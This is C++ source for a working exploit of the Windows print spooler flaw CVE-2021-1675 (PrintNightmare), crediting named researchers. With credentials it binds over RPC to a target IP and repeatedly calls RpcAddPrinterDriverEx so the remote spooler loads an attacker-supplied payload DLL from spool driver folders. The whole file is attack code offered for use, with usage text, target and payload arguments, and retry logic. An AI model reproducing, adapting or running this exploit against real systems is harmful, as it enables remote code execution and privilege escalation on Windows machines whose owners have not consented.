#define RPC_USE_NATIVE_WCHAR

#include <xpsprint.h>
#include <fstream>
#include <stdio.h>
#include <tchar.h>
#include <io.h>
#include <Windows.h>
#include <memory>
#include <string.h>

#pragma comment(lib, "rpcrt4.lib")

#include "rcp_def.h"

wchar_t uuid[MAX_PATH] = L"12345678-1234-abcd-ef00-0123456789ab";
WCHAR payloadPath[0x200] = { 0 };
WCHAR destinationPath[0x200] = { 0 };
WCHAR payloadName[0x200] = { 0 };
WCHAR targetIpAddress[0x200] = { 0 };
WCHAR targetPath[0x200] = { 0 };
WCHAR targetUserName[0x200] = { 0 };
WCHAR targetUserPass[0x200] = { 0 };

WCHAR targetDLLPath[MAX_PATH] = { 0 };

int fileExists(wchar_t* file) {
    WIN32_FIND_DATA FindFileData;
    HANDLE handle = FindFirstFileW(file, &FindFileData);
    int found = handle != INVALID_HANDLE_VALUE;
    if (found) {
        FindClose(handle);
    }
    return found;
}

wchar_t* findDLLPath() {

    wchar_t targetDLLPath[MAX_PATH] = { 0 };

    DWORD dwNeeded;
    LPBYTE lpDriverInfo;
    DWORD dwReturned;
    DRIVER_INFO_2* pInfo;
    DWORD i;

    EnumPrinterDriversW(NULL, NULL, 2, NULL, 0, &dwNeeded, &dwReturned);

    lpDriverInfo = (LPBYTE)LocalAlloc(LPTR, dwNeeded);
    if (lpDriverInfo == NULL) {
        return 0;
    }

    EnumPrinterDrivers(NULL, NULL, 2, lpDriverInfo, dwNeeded, &dwNeeded, &dwReturned);

    pInfo = (DRIVER_INFO_2*)lpDriverInfo;

    for (i = 0; i < dwReturned; i++) {

        if (wcsstr(pInfo->pDriverPath, L"ntprint.inf_amd64")) {

            wchar_t tempDrive1[_MAX_DRIVE] = { 0 };
            wchar_t tempDirectory1[_MAX_DIR] = { 0 };
            wchar_t tempFileName1[_MAX_FNAME] = { 0 };
            wchar_t tempFileExtension1[_MAX_EXT] = { 0 };

            _wsplitpath_s(pInfo->pDriverPath, &tempDrive1[0], _MAX_DRIVE, &tempDirectory1[0], _MAX_DIR, &tempFileName1[0], _MAX_FNAME, &tempFileExtension1[0], _MAX_EXT);

            wchar_t* targetDLLName = (LPWSTR)L"UNIDRV.DLL";

            wcscat_s(targetDLLPath, MAX_PATH, tempDrive1);
            wcscat_s(targetDLLPath, MAX_PATH, tempDirectory1);
            wcscat_s(targetDLLPath, MAX_PATH, targetDLLName);
            
            if (fileExists(targetDLLPath)) {
                
                LocalFree(lpDriverInfo);

                return targetDLLPath;

            }

        }

        pInfo++;
    }

    LocalFree(lpDriverInfo);

}

RPC_STATUS CreateBindingHandle(RPC_BINDING_HANDLE* binding_handle) {
    RPC_STATUS status;
    RPC_BINDING_HANDLE v5;
    RPC_SECURITY_QOS SecurityQOS = {};
    RPC_WSTR StringBinding = nullptr;
    RPC_BINDING_HANDLE Binding;

    StringBinding = 0;
    Binding = 0;

    status = RpcStringBindingComposeW((RPC_WSTR)L"12345678-1234-abcd-ef00-0123456789ab", (RPC_WSTR)L"ncacn_ip_tcp", (RPC_WSTR)targetIpAddress, NULL, nullptr, &StringBinding);
    if (status == RPC_S_OK) {

        status = RpcBindingFromStringBindingW(StringBinding, &Binding);
        RpcStringFreeW(&StringBinding);
        if (!status) {
            SecurityQOS.Version = 1;
            SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_DELEGATE;
            SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_IGNORE_DELEGATE_FAILURE;
            SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_DYNAMIC;

            _SEC_WINNT_AUTH_IDENTITY_A identity;
            identity.Domain = NULL;
            identity.DomainLength = 0;
            identity.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
            identity.User = (unsigned char*)targetUserName;
            identity.UserLength = lstrlenW(targetUserName);
            identity.Password = (unsigned char*)targetUserPass;
            identity.PasswordLength = lstrlenW(targetUserPass);

            status = RpcBindingSetAuthInfoExW(Binding, 0, 6u, 0xAu, &identity, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
            if (!status) {
                v5 = Binding;
                Binding = 0;
                *binding_handle = v5;
                printf("[+] Binding successful!!\n");
            }
        }
    }

    if (Binding) {
        RpcBindingFree(&Binding);
    }

    return status;
}

int wmain(int argc, wchar_t* argv[]) {

    printf("\n[*] CVE-2021-1675 LPE Exploit\n\n");
    printf("[*] Authors: Zhiniang Peng (@edwardzpeng) & Xuefeng Li (@lxf02942370)\n\n");
    printf("[*] Modified by: Halil Dalabasmaz (@hlldz)\n\n");
    
    if (argc != 5) {
        printf("[*] Usage: CVE-2021-1675-LPE.exe IP_ADDRESS PAYLOAD_DLL_PATH USERNAME PASSWORD\n");
        return 0;
    }

    wsprintf(targetIpAddress, L"%s", argv[1]);
    wsprintf(targetPath, L"\\\\%s", argv[1]);
    wsprintf(payloadPath, L"%s", argv[2]);
    wsprintf(payloadName, L"%s", wcsrchr(argv[2], '\\') + 1);
    wsprintf(targetUserName, L"%s", argv[3]);
    wsprintf(targetUserPass, L"%s", argv[4]);
    wsprintf(targetDLLPath, L"%ls", findDLLPath());

    wprintf(L"[*] TARGET_IP_ADDRESS:\t %s\n", targetIpAddress);
    wprintf(L"[*] TARGET_PATH:\t %s\n", targetPath);
    wprintf(L"[*] TARGET_DLL_PATH:\t %ls\n\n", targetDLLPath);

    wprintf(L"[*] TARGET_USER_NAME:\t %s\n", targetUserName);
    wprintf(L"[*] TARGET_USER_PASS:\t %s\n\n", targetUserPass);

    wprintf(L"[*] PAYLOAD_PATH:\t %s\n", payloadPath);
    wprintf(L"[*] PAYLOAD_NAME:\t %s\n\n", payloadName);
    
    for (int i = 1; i < 3; i++) {

        printf("\n[*] Exploitation attempt: %d\n\n", i);

        DRIVER_INFO_2 info;
        info.cVersion = 3;
        info.pConfigFile = (LPWSTR)L"C:\\Windows\\System32\\kernelbase.dll";
        info.pDataFile = payloadPath;

        info.pDriverPath = targetDLLPath; //(LPWSTR)L"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_19a3fe50fa9a21b6\\Amd64\\UNIDRV.DLL";

        info.pEnvironment = (LPWSTR)L"Windows x64";
        info.pName = (LPWSTR)L"1234";
        RPC_BINDING_HANDLE handle;
        RPC_STATUS status = CreateBindingHandle(&handle);

        DRIVER_CONTAINER container_info;
        container_info.Level = 2;
        container_info.DriverInfo.Level2 = new DRIVER_INFO_2();
        container_info.DriverInfo.Level2->cVersion = 3;
        container_info.DriverInfo.Level2->pConfigFile = info.pConfigFile;
        container_info.DriverInfo.Level2->pDataFile = info.pDataFile;
        container_info.DriverInfo.Level2->pDriverPath = info.pDriverPath;
        container_info.DriverInfo.Level2->pEnvironment = info.pEnvironment;
        container_info.DriverInfo.Level2->pName = info.pName;

        RpcTryExcept{
            DWORD hr = RpcAddPrinterDriverEx(handle, targetPath, &container_info, APD_COPY_ALL_FILES | 0x10 | 0x8000);

            printf("[-] RpcAddPrinterDriverEx: %d\n",hr);

            wsprintf(destinationPath, L"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\1\\%s", payloadName);
            container_info.DriverInfo.Level2->pConfigFile = destinationPath;

            hr = RpcAddPrinterDriverEx(handle, targetPath, &container_info, APD_COPY_ALL_FILES | 0x10 | 0x8000);
            wprintf(L"[*] Try to load %s. Error Code: %d\n", container_info.DriverInfo.Level2->pConfigFile,hr);
            if (hr == 0) return 0;

            wsprintf(destinationPath, L"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\2\\%s", payloadName);
            container_info.DriverInfo.Level2->pConfigFile = destinationPath;
            hr = RpcAddPrinterDriverEx(handle, targetPath, &container_info, APD_COPY_ALL_FILES | 0x10 | 0x8000);
            wprintf(L"[*] Try to load %s. Error Code: %d\n", container_info.DriverInfo.Level2->pConfigFile,hr);
            if (hr == 0) return 0;

            wsprintf(destinationPath, L"C:\\Windows\\System32\\spool\\drivers\\x64\\3\\old\\3\\%s", payloadName);
            container_info.DriverInfo.Level2->pConfigFile = destinationPath;
            hr = RpcAddPrinterDriverEx(handle, targetPath, &container_info, APD_COPY_ALL_FILES | 0x10 | 0x8000);
            wprintf(L"[*] Try to load %s. Error Code: %d\n", container_info.DriverInfo.Level2->pConfigFile,hr);
            if (hr == 0) return 0;

        }
            RpcExcept(1) {
            status = RpcExceptionCode();
            printf("[-] Rpc Error Code: %d\n", status);
        }   RpcEndExcept
        
        printf("[*] Sleeping 5 seconds...\n\n"); 
        Sleep(5000);
    }

    return 0;
}

extern "C" void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len) {
    return(malloc(len));
}

extern "C" void __RPC_USER midl_user_free(void __RPC_FAR * ptr) {
    free(ptr);
}